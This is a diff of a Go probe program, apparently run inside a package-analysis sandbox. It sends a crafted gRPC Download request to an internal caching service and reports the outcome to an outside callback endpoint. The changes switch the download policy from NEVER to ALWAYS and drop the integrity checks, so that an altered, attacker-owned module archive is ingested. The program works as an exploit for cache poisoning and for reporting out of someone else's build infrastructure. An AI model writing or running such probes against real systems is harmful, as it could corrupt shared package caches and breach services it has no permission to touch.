@@ -28,37 +28,32 @@ var compilerResultURL string
 var callbackSessionNonce string
 var probeUserAgent string
 var pinnedReadbackURL string
-var pinnedReadbackOrigin string
-var pinnedReadbackSession string
 var pinnedReadbackURLSHA256 string
+var expectedRequestPayloadSHA256 string
+var expectedRequestFrameSHA256 string
 var rpcDialAddress string
 
 const (
 	protocolVersion              = 1
 	moduleName                   = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion                 = "v0.0.67-codex"
-	expectedUserAgent            = "go-cgo-pkgsite-probe-v067-codex"
+	probeVersion                 = "v0.0.68-codex"
+	expectedUserAgent            = "go-cgo-pkgsite-probe-v068-codex"
 	targetRegistry               = "https://proxy.golang.org"
 	targetModuleName             = "github.com/benr00t3d/go-byteman-crosswrite-canary"
-	targetVersion                = "v0.0.1"
-	targetCanaryBytes            = 2512
-	targetSHA512                 = "a3b9e460a4e6c294b91d4677329ede02dd062ff70f431efb1b6853d98f3a146cb5cebafca064ec28e10e84a32b8e5c3892e8fce542528e40b654e5170e32cb68"
-	targetSHA256                 = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
-	targetSHA1                   = "b1cd071d32f0c5cd30699b5d27086059c3fba547"
-	targetMD5                    = "570588f59942a9c79262238525fbe16f"
+	targetVersion                = "v0.0.2"
+	targetCanaryBytes            = 2533
+	targetSHA512                 = "dbde2be146a4acf6688cfe781cb9481d53b1f70fab66df5229c696ccb203a4361cec7bde56ec85d1f283066c9e3d9f4661a1f311b26513884e33578c24805809"
+	targetSHA256                 = "e7c6ef7862d1fe3c34b3a45a5bf550dba42be42fd8d73c5404886c2dc3c24ee3"
+	targetSHA1                   = "0962315788a51d4612797c1a65e3cf571a4f7fb3"
+	targetMD5                    = "26daa179ad7734e7ec56007e92f1c481"
 	descriptorReceiptSHA256      = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
-	expectedPinnedURLSHA256      = "78d7361f8ebd389fc5da7ba45c0e69cde74fbc290522804942bc3cb42fe30334"
-	expectedRecordSHA256         = "adfb1c1ce1b1b12a6c7fb47bc71a599080dec7357763e3af5d937849c7961e47"
-	expectedDigestFieldSHA256    = "6bc319fc0d36191274cec1b7269adfd81385b88169cdf83a783dc882097a6b94"
-	expectedPathFieldSHA256      = "59af025ea13df7229bbdf0be891d14d7e5e329584c1f0ff5c52b6861abcf978f"
-	expectedIDFieldSHA256        = "98a540dcf85bd84794699b0522f3e5d8f5de0697b1b0c51eef1c39058ba58ce3"
-	expectedMetadataSHA256       = "d8a03518274139d9b6dbec8b09ce0e6d9ec1ddfc3c9d5a15119ca7c677d85a62"
-	expectedRequestPayloadSHA256 = "886249acb8b148c2ad89800b5c75a0fc1e2f850aeed18c44f58791673c7ce2c9"
-	expectedRequestFrameSHA256   = "05d350ade983db6225799090afb0ba7bf4dd15e5fa35e7997cfab357c88fafff"
+	expectedDigestFieldSHA256    = "76b91c61487c0969f4c83d8159d56d01129cfaea92ba4fa855ced3824a3fae75"
+	expectedMetadataSHA256       = "f15edffefd0c4601ff133a04f107df3492ca3eb3070ce223af5bbcd0db15451e"
+	canonicalProxyZipSHA256      = "e6492a7506743ffc579e1f33701944f9dfd42c695ccbd7d80aa7d5f95e972a90"
+	downloadSource               = "robert-owned-v068-content-ingest"
 	emptyValueSHA256             = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
-	priorFetchReceiptSHA256      = "bbfefc563e5321dc51676ed52d5e7f8d7daae3dc45c423da9fa7dd06bd5fee9d"
-	downloadPolicyName           = "NEVER"
-	downloadPolicyValue          = 1
+	downloadPolicyName           = "ALWAYS"
+	downloadPolicyValue          = 4
 	redirectPolicyName           = "FOLLOW_NONE"
 	redirectPolicyValue          = 2
 	callbackTimeout              = 30 * time.Second
@@ -202,11 +197,8 @@ type probeReport struct {
 	TargetURLSHA256         string         `json:"target_url_sha256"`
 	TargetBodySHA256        string         `json:"target_body_sha256"`
 	DescriptorReceiptSHA256 string         `json:"descriptor_receipt_sha256"`
-	PriorFetchReceiptSHA256 string         `json:"prior_fetch_receipt_sha256"`
-	ExpectedRecordSHA256    string         `json:"expected_record_sha256"`
+	CanonicalZipSHA256      string         `json:"canonical_proxy_zip_sha256"`
 	ExpectedDigestSHA256    string         `json:"expected_digest_field_sha256"`
-	ExpectedPathSHA256      string         `json:"expected_path_field_sha256"`
-	ExpectedIDSHA256        string         `json:"expected_id_field_sha256"`
 	StartedUTC              string         `json:"started_utc"`
 	FinishedUTC             string         `json:"finished_utc"`
 	Identity                identityResult `json:"identity"`
@@ -222,10 +214,7 @@ type wireField struct {
 type recordExpectation struct {
 	URL               string
 	URLSHA256         string
-	RecordSHA256      string
 	DigestFieldSHA256 string
-	PathFieldSHA256   string
-	IDFieldSHA256     string
 }
 type downloadResponseAnalysis struct {
 	RecordPresent bool
@@ -253,25 +242,25 @@ func main() {
 	identity := inspectIdentity(cwd)
 	report := newProbeReport(started, identity)
 	endpoint := genericResultURL
-	resultID := "v067-codex-" + identity.Lane
+	resultID := "v068-codex-" + identity.Lane
 	if identity.Lane == "capslock" {
 		endpoint = compilerResultURL
-		resultID = "v067-codex-capslock-download-never"
-		report.Download = runPinnedDownloadNever()
+		resultID = "v068-codex-capslock-content-ingest"
+		report.Download = runContentIngest()
 		if report.Download.Verified {
-			report.Reason = "Download with descriptor-pinned NEVER returned the exact prior v44 owned-B record without contacting its origin"
+			report.Reason = "one descriptor-pinned Download ALWAYS accepted the exact altered owned-B v0.0.2 archive"
 		} else {
-			report.Reason = "Download with descriptor-pinned NEVER did not verify the exact prior v44 owned-B record"
+			report.Reason = "the single content-ingest Download did not verify exact altered owned-B bytes"
 		}
 	} else {
-		report.Reason = "the fixed Byteman read-only-cache check is limited to the verified Capslock lane"
+		report.Reason = "the fixed owned-content ingest is limited to the verified Capslock lane"
 	}
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
 	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
-	return probeReport{Schema: "owned-byteman-download-never/v1", Module: moduleName, Version: probeVersion, TargetModule: targetModuleName, TargetVersion: targetVersion, TargetURLSHA256: pinnedReadbackURLSHA256, TargetBodySHA256: targetSHA256, DescriptorReceiptSHA256: descriptorReceiptSHA256, PriorFetchReceiptSHA256: priorFetchReceiptSHA256, ExpectedRecordSHA256: expectedRecordSHA256, ExpectedDigestSHA256: expectedDigestFieldSHA256, ExpectedPathSHA256: expectedPathFieldSHA256, ExpectedIDSHA256: expectedIDFieldSHA256, StartedUTC: started.UTC().Format(time.RFC3339Nano), Identity: identity, Download: downloadResult{Method: "/sos.byteman.Byteman/Download", PolicyName: downloadPolicyName, PolicyValue: downloadPolicyValue, RedirectPolicyName: redirectPolicyName, RedirectPolicyValue: redirectPolicyValue}}
+	return probeReport{Schema: "owned-byteman-content-ingest/v1", Module: moduleName, Version: probeVersion, TargetModule: targetModuleName, TargetVersion: targetVersion, TargetURLSHA256: pinnedReadbackURLSHA256, TargetBodySHA256: targetSHA256, DescriptorReceiptSHA256: descriptorReceiptSHA256, CanonicalZipSHA256: canonicalProxyZipSHA256, ExpectedDigestSHA256: expectedDigestFieldSHA256, StartedUTC: started.UTC().Format(time.RFC3339Nano), Identity: identity, Download: downloadResult{Method: "/sos.byteman.Byteman/Download", PolicyName: downloadPolicyName, PolicyValue: downloadPolicyValue, RedirectPolicyName: redirectPolicyName, RedirectPolicyValue: redirectPolicyValue}}
 }
 
 func validNonce(value string) bool {
@@ -299,12 +288,12 @@ func parseExactHTTPS(raw, expectedPath string) (*url.URL, error) {
 	return p, nil
 }
 func validateRuntimeConfiguration() error {
-	return validateRuntimeConfigurationWithExpectedSHA(expectedPinnedURLSHA256)
+	return validateRuntimeConfigurationWithExpectedSHA(pinnedReadbackURLSHA256)
 }
 
 func validateRuntimeConfigurationWithExpectedSHA(expectedURLSHA256 string) error {
-	if !validNonce(callbackSessionNonce) || !validNonce(pinnedReadbackSession) || callbackSessionNonce == pinnedReadbackSession || probeUserAgent != expectedUserAgent {
-		return errors.New("runtime identities were invalid or not isolated")
+	if !validNonce(callbackSessionNonce) || probeUserAgent != expectedUserAgent || len(expectedRequestPayloadSHA256) != 64 || len(expectedRequestFrameSHA256) != 64 {
+		return errors.New("runtime identities or request fingerprints were invalid")
 	}
 	g, err := parseExactHTTPS(genericResultURL, "/v1/result/"+callbackSessionNonce+"/generic")
 	if err != nil {
@@ -314,22 +303,22 @@ func validateRuntimeConfigurationWithExpectedSHA(expectedURLSHA256 string) error
 	if err != nil || g.Scheme != c.Scheme || g.Host != c.Host {
 		return errors.New("callback endpoints did not share one exact origin")
 	}
-	path := "/v1/goproxy/" + pinnedReadbackSession + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"
+	path := "/v1/goproxy/" + callbackSessionNonce + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"
 	r, err := parseExactHTTPS(pinnedReadbackURL, path)
-	if err != nil || pinnedReadbackOrigin != r.Scheme+"://"+r.Host || pinnedReadbackOrigin == g.Scheme+"://"+g.Host {
-		return errors.New("pinned v44 URL was not isolated from callback origin")
+	if err != nil || r.Scheme != g.Scheme || r.Host != g.Host {
+		return errors.New("owned-B URL did not share the exact callback origin")
 	}
 	d := sha256.Sum256([]byte(pinnedReadbackURL))
 	if pinnedReadbackURLSHA256 != expectedURLSHA256 || hex.EncodeToString(d[:]) != pinnedReadbackURLSHA256 {
-		return errors.New("pinned v44 URL digest mismatch")
+		return errors.New("owned-B URL digest mismatch")
 	}
 	return nil
 }
 func productionExpectation() recordExpectation {
-	return recordExpectation{URL: pinnedReadbackURL, URLSHA256: expectedPinnedURLSHA256, RecordSHA256: expectedRecordSHA256, DigestFieldSHA256: expectedDigestFieldSHA256, PathFieldSHA256: expectedPathFieldSHA256, IDFieldSHA256: expectedIDFieldSHA256}
+	return recordExpectation{URL: pinnedReadbackURL, URLSHA256: pinnedReadbackURLSHA256, DigestFieldSHA256: expectedDigestFieldSHA256}
 }
 
-func runPinnedDownloadNever() (result downloadResult) {
+func runContentIngest() (result downloadResult) {
 	started := time.Now()
 	payload := buildPinnedDownloadRequest()
 	frame := grpcFrame(payload)
@@ -392,7 +381,7 @@ func runPinnedDownloadNever() (result downloadResult) {
 		return
 	}
 	if !parsed.Analysis.RecordPresent || !parsed.Analysis.RecordMatched || !parsed.Analysis.StatusSet || parsed.Analysis.StatusCode != http.StatusOK {
-		result.Error = "DownloadResponse did not contain the exact v44 record with outer status 200"
+		result.Error = "DownloadResponse did not contain the exact altered owned-B record with outer status 200"
 		return
 	}
 	if !exactZeroGRPCStatus(result.GRPCStatusHeader, result.GRPCStatusTrailer) {
@@ -497,9 +486,6 @@ func analyzeDownloadRecord(raw []byte, expect recordExpectation) (downloadRecord
 	}
 	rd := sha256.Sum256(raw)
 	proof.RecordSHA256 = hex.EncodeToString(rd[:])
-	if proof.RecordSHA256 != expect.RecordSHA256 {
-		return proof, false, nil
-	}
 	fields, err := decodeWireFields(raw)
 	if err != nil {
 		return proof, false, err
@@ -568,21 +554,21 @@ func analyzeDownloadRecord(raw []byte, expect recordExpectation) (downloadRecord
 	}
 	for _, n := range []int{1, 2, 3, 4, 5, 7, 12, 16, 17} {
 		if counts[n] != 1 {
-			return proof, false, errors.New("exact v44 Download record omitted required field")
+			return proof, false, errors.New("content-ingest Download record omitted a required field")
 		}
 	}
 	for _, n := range []int{6, 8, 9, 10, 11, 13, 15, 19} {
 		if counts[n] != 0 {
-			return proof, false, errors.New("exact v44 Download record had unexpected optional field")
+			return proof, false, errors.New("content-ingest Download record had an unexpected optional field")
 		}
 	}
 	if counts[18] != 8 {
-		return proof, false, errors.New("exact v44 Download record had wrong header count")
+		return proof, false, errors.New("content-ingest Download record had wrong header count")
 	}
 	ud := sha256.Sum256(urlValue)
 	proof.URLSHA256 = hex.EncodeToString(ud[:])
 	if string(urlValue) != expect.URL || proof.URLSHA256 != expect.URLSHA256 {
-		return proof, false, errors.New("exact v44 Download URL mismatch")
+		return proof, false, errors.New("content-ingest Download URL mismatch")
 	}
 	dp, err := analyzeExactDigest(digestValue)
 	if err != nil {
@@ -592,7 +578,7 @@ func analyzeDownloadRecord(raw []byte, expect recordExpectation) (downloadRecord
 	md := sha256.Sum256(metadataValue)
 	proof.MetadataSHA256 = hex.EncodeToString(md[:])
 	if proof.MetadataSHA256 != expectedMetadataSHA256 || !exactTargetMetadata(metadataValue) {
-		return proof, false, errors.New("exact v44 Download metadata mismatch")
+		return proof, false, errors.New("content-ingest Download metadata mismatch")
 	}
 	pd := sha256.Sum256(pathValue)
 	id := sha256.Sum256(idValue)
@@ -600,8 +586,8 @@ func analyzeDownloadRecord(raw []byte, expect recordExpectation) (downloadRecord
 	proof.IDPresent, proof.IDBytes, proof.IDSHA256 = len(idValue) > 0, len(idValue), hex.EncodeToString(id[:])
 	proof.Size, proof.StatusCode = sizeValue, statusValue
 	proof.ContentType, proof.CacheControl, proof.HeaderCount = string(contentType), string(cacheControl), counts[18]
-	if sizeValue != targetCanaryBytes || statusValue != http.StatusOK || string(contentType) != "application/zip" || string(cacheControl) != "no-store" || !proof.PathPresent || !proof.IDPresent || proof.PathSHA256 != expect.PathFieldSHA256 || proof.IDSHA256 != expect.IDFieldSHA256 || dp.RawSHA256 != expect.DigestFieldSHA256 || !dp.AllExact {
-		return proof, false, errors.New("exact v44 Download integrity fields did not match")
+	if sizeValue != targetCanaryBytes || statusValue != http.StatusOK || string(contentType) != "application/zip" || string(cacheControl) != "no-store" || !proof.PathPresent || !proof.IDPresent || dp.RawSHA256 != expect.DigestFieldSHA256 || !dp.AllExact {
+		return proof, false, errors.New("content-ingest Download integrity fields did not match")
 	}
 	proof.Matched = true
 	return proof, true, nil
@@ -737,6 +723,7 @@ func buildPinnedDownloadRequest() []byte {
 	request := appendStringField(nil, 1, pinnedReadbackURL)
 	request = appendBytesField(request, 4, buildTargetMetadata())
 	request = appendVarintField(request, 5, downloadPolicyValue)
+	request = appendStringField(request, 6, downloadSource)
 	redirect := appendVarintField(nil, 1, redirectPolicyValue)
 	return appendBytesField(request, 8, redirect)
 }
@@ -1041,7 +1028,7 @@ func cleanError(err error) string {
 	return cleanSensitiveText(err.Error())
 }
 func cleanSensitiveText(value string) string {
-	for _, secret := range []string{callbackSessionNonce, pinnedReadbackSession, pinnedReadbackURL, rpcDialAddress} {
+	for _, secret := range []string{callbackSessionNonce, pinnedReadbackURL, rpcDialAddress} {
 		if secret != "" {
 			value = strings.ReplaceAll(value, secret, "[redacted]")
 		}
